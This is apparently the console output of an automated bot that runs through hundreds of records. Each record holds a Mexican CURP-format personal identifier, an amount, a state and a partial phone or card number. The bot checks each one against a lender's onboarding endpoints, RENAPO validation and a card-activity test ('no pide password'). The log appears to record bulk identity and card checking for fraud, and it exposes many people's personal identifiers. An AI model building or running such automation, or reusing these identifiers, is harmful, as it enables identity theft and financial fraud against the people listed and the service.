[2825] ID:3674535 | SAAB751003MDFNNR03 | $170,820 | CIUDAD DE ME | T:8834... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[2826] ID:4883108 | SOGR790221HNLLRB08 | $170,820 | NUEVO LEON | T:5852... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.2s)
[2827] ID:3453757 | RACJ711208HDFPHR03 | $170,810 | CIUDAD DE ME | T:5037... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8834 para ID:3674535 ($170,820)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.7s)
[2828] ID:3002771 | CORR710510HASVMB04 | $170,800 | AGUASCALIENT | T:9219... [🔴 OFF] Rechazo bancario (PE1002) (12.6s)
[2829] ID:1855796 | ROIR700427HMCJSB02 | $170,750 | ESTADO DE ME | T:5590... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.5s)
[2830] ID:4788978 | MAAM710917MCLDRR04 | $170,696 | COAHUILA | T:5110... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.0s)
[2831] ID:1040625 | HETF711226HJCRVR09 | $170,690 | JALISCO | T:1826... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9219 para ID:3002771 ($170,800)... [🔴 OFF] Rechazo bancario (PE110) (14.7s)
[2832] ID:1273944 | HEJU690616HDFNRN03 | $170,670 | CIUDAD DE ME | T:2086... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.7s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1826 para ID:1040625 ($170,690)... [2833] ID:4374974 | AECA710213MBCRRN04 | $170,660 | BAJA CALIFOR | T:8739... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2834] ID:2917682 | GATH730326HMCRLM01 | $170,640 | ESTADO DE ME | T:5614... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2835] ID:4267660 | OOOE731002MDFCLM01 | $170,630 | CIUDAD DE ME | T:5212... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[2836] ID:58975 | CACG750906HMNRNB03 | $170,610 | MICHOACAN | T:9591... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[2837] ID:1577712 | CAAA691204HNLRNL05 | $170,610 | NUEVO LEON | T:3002... [🔴 OFF] Rechazo bancario (PE170) (15.6s)
[2838] ID:664576 | GIHB720728MDFLLR06 | $170,600 | CIUDAD DE ME | T:6496... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.6s)
[2839] ID:2941288 | GAJJ791017HMNLCR08 | $170,600 | MICHOACAN | T:1521... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (19.2s)
[2840] ID:4557392 | VEBV740801HASLRC00 | $170,600 | AGUASCALIENT | T:1647... [🔴 OFF] Contacto preexistente (/confirm-contact) (17.3s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6496 para ID:664576 ($170,600)... [2841] ID:853399 | LOOC690326MDFXCR00 | $170,570 | CIUDAD DE ME | T:0176... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE040) (12.8s)
[2842] ID:968961 | CACM690502MNLNMN03 | $170,570 | NUEVO LEON | T:7410... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[2843] ID:4675396 | LABR700619MCSNRY05 | $170,561 | CHIAPAS | T:5337... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[2844] ID:1892272 | CAOS710906HCSMVR09 | $170,520 | CHIAPAS | T:4371... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[2845] ID:1429300 | MAGM751227MMCYDR05 | $170,500 | ESTADO DE ME | T:4126... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.5s)
[2846] ID:3565277 | AICL711117HDFLSS05 | $170,490 | CIUDAD DE ME | T:2088... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[2847] ID:3864694 | PIMT720206MVRCRR00 | $170,470 | VERACRUZ | T:9534... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2848] ID:1576029 | COGR691224HTSLRL02 | $170,440 | TAMAULIPAS | T:2111... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.9s)
[2849] ID:3489614 | MONE740201HDFRVD06 | $170,400 | CIUDAD DE ME | T:6860... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2088 para ID:3565277 ($170,490)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.9s)
[2850] ID:3986324 | RAMA781204MMCMZR02 | $170,400 | ESTADO DE ME | T:6004... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.4s)
[2851] ID:3789632 | MOSG780710HBCRCB00 | $170,390 | BAJA CALIFOR | T:7875... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2852] ID:157600 | GOUR731218MJCNLC02 | $170,350 | JALISCO | T:3845... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.8s)
[2853] ID:1343661 | VACL760208HOCRSS01 | $170,340 | OAXACA | T:0443... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2854] ID:3918830 | SAFG730801HTSCNB09 | $170,340 | TAMAULIPAS | T:7757... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.6s)
[2855] ID:3074002 | BABM000101HJCSRRA4 | $170,310 | JALISCO | T:6701... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2856] ID:1278192 | AOPO690809HDFCRS08 | $170,300 | CIUDAD DE ME | T:0899... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[2857] ID:2575537 | MAPI710603HHGCLS02 | $170,300 | HIDALGO | T:3134... [🔴 OFF] Rechazo bancario (PE021) (10.8s)
[2858] ID:3182984 | AALA720905MQTLRL01 | $170,300 | QUERETARO | T:8841... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.8s)
[2859] ID:3370238 | CACT701222HGRTRR00 | $170,300 | GUERRERO | T:3009... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.7s)
[2860] ID:4679683 | SABH720210HNTNJC07 | $170,300 | NAYARIT | T:1399... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.5s)
[2861] ID:3530268 | GAFE700319HDFRLR05 | $170,290 | CIUDAD DE ME | T:2086... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.7s)
[🔴 OFF] Contacto preexistente (/confirm-contact) (15.0s)
[2862] ID:2122754 | GURA710629HNLTML05 | $170,280 | NUEVO LEON | T:3398... [2863] ID:4704163 | SAOB750215MMCNLL09 | $170,280 | ESTADO DE ME | T:3215... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.4s)
[2864] ID:848192 | CACX701015HNLVVR02 | $170,250 | NUEVO LEON | T:5936... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.2s)
[2865] ID:2487699 | HESA700621MDFRNL07 | $170,250 | CIUDAD DE ME | T:9887... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[2866] ID:159330 | VAAR691010HDFLRC01 | $170,220 | CIUDAD DE ME | T:7295... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3215 para ID:4704163 ($170,280)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[2867] ID:195901 | RURE710307HQTZSD04 | $170,220 | QUERETARO | T:4386... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.3s)
[2868] ID:3173494 | RUPM710211HQRZNR02 | $170,190 | QUINTANA ROO | T:6982... [⚠️ RETRY] Init HTTP 403 (3.5s)
[2869] ID:289651 | MAMM740531HJCRRR01 | $170,180 | JALISCO | T:3508... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2870] ID:863288 | FOSA690805HMCLRL05 | $170,180 | ESTADO DE ME | T:4227... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.0s)
[2871] ID:1693907 | AOPO690809HDFCRS08 | $170,180 | CIUDAD DE ME | T:2164... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[2872] ID:2877131 | FIER690428HDFGSB07 | $170,170 | CIUDAD DE ME | T:7453... [🔴 OFF] Rechazo bancario (PE021) (11.4s)
[2873] ID:2114200 | SARJ750519HNLNSV06 | $170,140 | NUEVO LEON | T:8188... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (11.3s)
[2874] ID:2345277 | GOLJ701216HJCNZS03 | $170,140 | JALISCO | T:5629... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[2875] ID:432496 | NACA701116HMNVRN00 | $170,130 | MICHOACAN | T:7752... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2876] ID:4863345 | SERS760125HTSRNR09 | $170,120 | TAMAULIPAS | T:1312... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.5s)
[2877] ID:415766 | CUCF740131HPLRHR04 | $170,100 | PUEBLA | T:8329... [⚠️ RETRY] Excepción red: Failed to perform, curl: (28) Operation timed out after 6014 (12.3s)
[2878] ID:1238718 | COFZ690717MVRLNL00 | $170,100 | VERACRUZ | T:9921... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.9s)
[2879] ID:1654731 | BESC740807HDFRNR06 | $170,100 | CIUDAD DE ME | T:5108... [🔴 OFF] Rechazo bancario (PE040) (20.0s)
[2880] ID:2861516 | LOJR720701HMSBRB09 | $170,100 | MORELOS | T:8196... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (13.4s)
[2881] ID:3532139 | POLG700324HMCRPR04 | $170,100 | ESTADO DE ME | T:8523... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2882] ID:3618011 | ROJJ690116HASMSM04 | $170,100 | AGUASCALIENT | T:7455... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.2s)
[2883] ID:3339878 | BACJ720407HMCRBR04 | $170,080 | ESTADO DE ME | T:5035... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8196 para ID:2861516 ($170,100)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2884] ID:3820376 | SAAS691007HVRRGR01 | $170,080 | VERACRUZ | T:4302... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.0s)
[2885] ID:4289898 | LEFR701116HNLLNM03 | $170,070 | NUEVO LEON | T:5485... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.5s)
[2886] ID:1777970 | VIGC780429HMCCRR07 | $170,050 | ESTADO DE ME | T:8763... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.2s)
[2887] ID:783846 | BAPD720507MGRRDS04 | $170,040 | GUERRERO | T:4160... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.1s)
[2888] ID:1837779 | FOGM730223HMCLLG04 | $170,040 | ESTADO DE ME | T:9308... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5485 para ID:4289898 ($170,070)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.6s)
[2889] ID:305523 | GOCL740820HGTMHS09 | $170,000 | GUANAJUATO | T:7786... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (19.6s)
[2890] ID:468924 | PELG730221MPLRPB09 | $170,000 | PUEBLA | T:7745... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.6s)
[2891] ID:545696 | COMC741126HNLPNH04 | $170,000 | NUEVO LEON | T:1042... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[2892] ID:601436 | SOVE800428MGTTZR07 | $170,000 | GUANAJUATO | T:5187... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.6s)
[2893] ID:671268 | FIGR801025HNLRNC08 | $170,000 | NUEVO LEON | T:9211... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5187 para ID:601436 ($170,000)... [2894] ID:714597 | DIDM690626HQRZRR02 | $170,000 | QUINTANA ROO | T:8812... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2895] ID:723191 | VIMN760810MVRLJB05 | $170,000 | TUXTEPEC | T:4724... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.0s)
[2896] ID:776992 | BAPL750506MMCRLR09 | $170,000 | ESTADO DE ME | T:4210... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2897] ID:794157 | AUAJ740723HDFGCR05 | $170,000 | CIUDAD DE ME | T:6161... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[2898] ID:871791 | GURC730105MVRZDR00 | $170,000 | VERACRUZ | T:3891... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[2899] ID:910394 | ZARM750518MSORSR05 | $170,000 | SINALOA | T:4952... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2900] ID:917741 | BEAM740927MMNLLR01 | $170,000 | MICHOACAN | T:9879... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2901] ID:987330 | SAVC730917HMCNLR02 | $170,000 | ESTADO DE ME | T:8396... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.9s)
[2902] ID:1138522 | MAAM700825MDFLRN00 | $170,000 | CIUDAD DE ME | T:3656... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (18.2s)
[2903] ID:1265434 | PERC700402HNLRDL08 | $170,000 | NUEVO LEON | T:8111... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.3s)
[2904] ID:1453309 | ROAS781219MNLDLC01 | $170,000 | NUEVO LEON | T:0300... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[2905] ID:1527361 | RIFR750425HCMVLF07 | $170,000 | COLIMA | T:5842... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2906] ID:1555652 | GAGF800322HGTLRR09 | $170,000 | GUANAJUATO | T:8522... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.8s)
[2907] ID:1555686 | LEGR690409HCGNRC03 | $170,000 | COAHUILA | T:1844... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2908] ID:1641787 | PARA690409HSODMN07 | $170,000 | SONORA | T:8283... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[2909] ID:1681744 | CAVE750402HSOHLM03 | $170,000 | SINALOA | T:4936... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.3s)
[2910] ID:1753537 | OIAR791207HGRRND05 | $170,000 | GUERRERO | T:0310... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2911] ID:1783735 | SAAL790208HVRNLS00 | $170,000 | VERACRUZ | T:3901... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.8s)
[2912] ID:1939144 | BORA700921HPLNZL07 | $170,000 | PUEBLA | T:5942... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.3s)
[2913] ID:1950150 | GOSF800115HQRNXR02 | $170,000 | QUINTANA ROO | T:8667... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0310 para ID:1753537 ($170,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[2914] ID:1962923 | ROCE710710HNLDRD02 | $170,000 | NUEVO LEON | T:0862... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.1s)
[2915] ID:2249748 | MEVJ761012HNLNZN02 | $170,000 | NUEVO LEON | T:8274... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.4s)
[2916] ID:2256221 | RIRA761221HNLZSL01 | $170,000 | NUEVO LEON | T:9339... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[2917] ID:2329287 | SETM720424HDFRRG09 | $170,000 | CIUDAD DE ME | T:3284... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8274 para ID:2249748 ($170,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.2s)
[2918] ID:2402283 | GUBG720529HNLTLN03 | $170,000 | NUEVO LEON | T:0320... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.7s)
[2919] ID:2518943 | HULM720223MHGRRR01 | $170,000 | HIDALGO | T:5849... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3284 para ID:2329287 ($170,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.7s)
[2920] ID:2545181 | RAOY711205MVZMRL00 | $170,000 | VERACRUZ | T:2343... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[2921] ID:2735988 | GOAV771023HBCNGC09 | $170,000 | BAJA CALIFOR | T:4558... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0320 para ID:2402283 ($170,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.5s)
[2922] ID:2756590 | NUMV760508HDFNRC04 | $170,000 | CIUDAD DE ME | T:6275... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.1s)
[2923] ID:3018506 | MEAJ721022HDFDGR07 | $170,000 | CIUDAD DE ME | T:9448... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[2924] ID:3070133 | AUMG750802HBCGNR01 | $170,000 | BAJA CALIFOR | T:8119... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.5s)
[2925] ID:3208663 | OUCJ700131MSOSRN03 | $170,000 | SINALOA | T:4309... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8119 para ID:3070133 ($170,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.5s)
[2926] ID:3232169 | EAPA730502HMCSNR09 | $170,000 | ESTADO DE ME | T:7108... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[2927] ID:3315595 | AANS731104HGTLVR06 | $170,000 | GUANAJUATO | T:5959... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2928] ID:3342500 | BAML740628HBSLNC07 | $170,000 | BAJA CALIFOR | T:7393... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.9s)
[2929] ID:3466563 | NUCS720601MDFNSN06 | $170,000 | CIUDAD DE ME | T:2271... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2930] ID:3502752 | GAAG710731HBSRVR06 | $170,000 | BAJA CALIFOR | T:1969... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2931] ID:3543249 | CAVE750402HSOHLM03 | $170,000 | SINALOA | T:0404... [2932] ID:3652456 | WAML690921HDFLGN05 | $170,000 | CIUDAD DE ME | T:8758... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[2933] ID:3731368 | GARG720319HCGRBR02 | $170,000 | COAHUILA | T:1490... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[2934] ID:3811132 | CAMB711006HMCSYR09 | $170,000 | ESTADO DE ME | T:7961... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[2935] ID:3892588 | MOVN741027HTSNLR04 | $170,000 | TAMAULIPAS | T:2611... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.3s)
[2936] ID:4040316 | ROMS700520HSPDRR05 | $170,000 | SAN LUIS POT | T:6967... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.2s)
[2937] ID:4076935 | AAGG690706HJCLNR00 | $170,000 | JALISCO | T:9000... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2611 para ID:3892588 ($170,000)... [🔴 OFF] Rechazo bancario (PE160) (14.2s)
[2938] ID:4084264 | MEGG710324HNLNRL07 | $170,000 | NUEVO LEON | T:4056... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2939] ID:4266179 | VERC700213MGTLSR08 | $170,000 | GUANAJUATO | T:5281... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.8s)
[2940] ID:4270605 | GOEA750518HMCMSL02 | $170,000 | ESTADO DE ME | T:8008... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5281 para ID:4266179 ($170,000)... [🔴 OFF] Rechazo bancario (PE170) (15.0s)
[2941] ID:4272668 | LAPR710829HCHRRC06 | $170,000 | CHIHUAHUA | T:4795... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.5s)
[2942] ID:4388650 | CARB700805MBCSML09 | $170,000 | BAJA CALIFOR | T:5034... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.5s)
[2943] ID:4470248 | CARA710903MBCRDL09 | $170,000 | BAJA CALIFOR | T:9951... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4795 para ID:4272668 ($170,000)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.2s)
[2944] ID:4546289 | FOES720814HHGLVL01 | $170,000 | HIDALGO | T:7141... [🔴 OFF] Rechazo bancario (PE110) (15.3s)
[2945] ID:4575323 | PIML690825MMNNRR06 | $170,000 | MICHOACAN | T:7223... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[2946] ID:4685779 | GOME730529HASMYN03 | $170,000 | AGUASCALIENT | T:1760... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2947] ID:4690503 | AEFE690125MTCLNL07 | $170,000 | TABASCO | T:0799... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.2s)
[2948] ID:4724403 | LAHA730422MDFLRN08 | $170,000 | CIUDAD DE ME | T:5343... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.2s)
[2949] ID:4775978 | RAME740706MJCMRV04 | $170,000 | JALISCO | T:2095... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.3s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2095 para ID:4775978 ($170,000)... [2950] ID:3458094 | HALA730715HVRMLR03 | $169,980 | VERACRUZ | T:3268... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.7s)
[2951] ID:220708 | AATM730701HYCMLG02 | $169,970 | YUCATAN | T:0118... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2952] ID:1114461 | AERA710101HZSRZM01 | $169,950 | ZACATECAS | T:3535... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2953] ID:3211227 | LUCL700219HMNNRS05 | $169,940 | MICHOACAN | T:6726... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[2954] ID:4592863 | TOIL701025HSORBS07 | $169,930 | SONORA | T:0980... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.5s)
[2955] ID:334073 | MARA701029HMCRZL06 | $169,920 | ESTADO DE ME | T:8270... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6726 para ID:3211227 ($169,940)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2956] ID:3118814 | RACL690312HVRMSS06 | $169,920 | VERACRUZ | T:0135... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[2957] ID:3408098 | CABC750515HOCHRS08 | $169,920 | OAXACA | T:5061... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[2958] ID:3235165 | MOOR700927HCGRNC05 | $169,900 | COAHUILA | T:0980... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[2959] ID:4372076 | GOAC731227HQRNLR07 | $169,900 | QUINTANA ROO | T:6048... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[2960] ID:2918601 | SOLE700902HDFTNS06 | $169,880 | CIUDAD DE ME | T:6465... [🔴 OFF] Rechazo bancario (PE170) (17.7s)
[2961] ID:1390570 | SAVR741230HJCNNM08 | $169,860 | JALISCO | T:1268... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2962] ID:2770037 | AAPJ750219HVRMRV07 | $169,800 | VERACRUZ | T:8872... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2963] ID:2572262 | RORE761217HQTDVD03 | $169,780 | QUERETARO | T:4328... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.5s)
[2964] ID:1583078 | BAJO750719HMCRSR00 | $169,770 | ESTADO DE ME | T:8385... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2965] ID:1927368 | OEPM760303HDFRRR07 | $169,750 | CIUDAD DE ME | T:4086... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.6s)
[2966] ID:3540009 | CABD750711HDFLLV02 | $169,740 | CIUDAD DE ME | T:6163... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4328 para ID:2572262 ($169,780)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[2967] ID:3301729 | EISI690404MSOSNS04 | $169,730 | SINALOA | T:5104... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[2968] ID:181546 | PAFI720518MMCLLV04 | $169,720 | ESTADO DE ME | T:7243... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (13.0s)
[2969] ID:1433942 | OOLD750504HJCLPV04 | $169,720 | JALISCO | T:9487... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (14.0s)
[2970] ID:1317309 | CUVE700910MSORRD08 | $169,690 | SONORA | T:3759... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[2971] ID:4098691 | CAHG710228HSONRN02 | $169,680 | SONORA | T:7562... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.8s)
[2972] ID:1237423 | MUOJ700705HDFNRS01 | $169,660 | CIUDAD DE ME | T:3402... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2973] ID:942868 | COCJ730626HCMNSN03 | $169,650 | COLIMA | T:4119... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2974] ID:1225980 | AIJR000101HMCRMCA4 | $169,650 | ESTADO DE ME | T:2923... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[2975] ID:1885437 | GOGR710823HMCNRD07 | $169,650 | ESTADO DE ME | T:1457... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2976] ID:142107 | JOPM710313HVRNNR07 | $169,590 | VERACRUZ | T:1257... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.3s)
